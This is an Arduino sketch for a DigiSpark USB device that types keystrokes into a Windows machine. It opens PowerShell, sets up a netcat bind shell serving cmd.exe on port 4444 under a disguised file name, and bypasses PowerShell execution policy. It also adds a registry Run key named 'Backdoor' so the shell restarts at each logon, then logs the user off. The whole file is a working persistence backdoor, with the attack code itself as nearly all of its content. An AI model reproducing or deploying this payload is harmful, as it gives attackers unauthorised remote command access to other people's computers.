#include "DigiKeyboard.h"

void setup() {
  // Wait for the machine to detect the DigiSpark, then send a wake-up signal
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Allow for full keyboard use, then open the Windows run dialog
  DigiKeyboard.sendKeyStroke(MOD_CONTROL_RIGHT); // If in VirtualBox, will allow for left CTRL usage
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Use the run dialog to open a Powershell window
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Create a tmp.ps1 file that will open a netcat bind shell listener
  DigiKeyboard.print("\"C:\\winconfig.exe -L -p 4444 -e cmd.exe\" > C:\\tmp.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Create a run.bat file that will run the tmp.ps1 file
  DigiKeyboard.print("Set-Content -Path 'C:\\run.bat' -Value '@echo off & PowerShell -NoProfile -ExecutionPolicy Bypass -Command \"& C:\\tmp.ps1\" & pause'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Make a Registry Run Key named Backdoor that will run the .bat file when the current user logs in
  DigiKeyboard.print("REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Backdoor\" /t REG_SZ /d \"C:\\run.bat\" /f");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Logoff the current user
  DigiKeyboard.print("logoff");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  
}
